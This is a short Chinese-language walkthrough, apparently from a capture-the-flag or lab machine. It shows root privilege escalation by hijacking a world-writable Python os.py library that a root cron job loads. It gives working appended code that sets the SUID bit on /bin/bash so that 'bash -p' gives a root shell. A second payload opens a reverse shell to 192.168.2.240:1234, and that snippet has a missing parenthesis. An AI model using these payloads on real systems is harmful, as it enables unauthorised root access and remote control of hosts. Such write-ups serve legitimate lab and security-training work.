方案一

因为引入了os.py的库，那么可以对os.py这个库进行修改(python库劫持)，并且符合我们进行提权的方案，让/bin/bash具有suid权限

david@system:~$find / -name os.py 2>/dev/null
/usr/lib/python3.9/os.py
david@system:~$ ls -l /usr/lib/python3.9/os.py
-rw-rw-rw- 1 root root 39064 Aug 20 08:22 /usr/lib/python3.9/os.py

这个文件可写入，那么可以在os.py的后面加上下面的内容

def malicious():
    import os
    os.system("chmod u+s /bin/bash 2>/dev/null")

malicious()

然后等待定时任务的只需即可

david@system:~$ ls -l /bin/bash
-rwxr-xr-x 1 root root 1234376 Aug  4  2021 /bin/bash
david@system:~$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1234376 Aug  4  2021 /bin/bash

这里可以看到-rwsr-xr-x（而不是 -rwxr-xr-x）那么说明/bin/bash也就是suid权限了

david@system:~$ /bin/bash -p

方案二

也是对os.py进行写入内容，只不过这个是建立一个反向 Shell 连接回攻击机

def malicious():
    import socket, subprocess, os
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("192.168.2.240", 1234)
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(["/bin/bash", "-i"])
    except:
        pass

malicious()
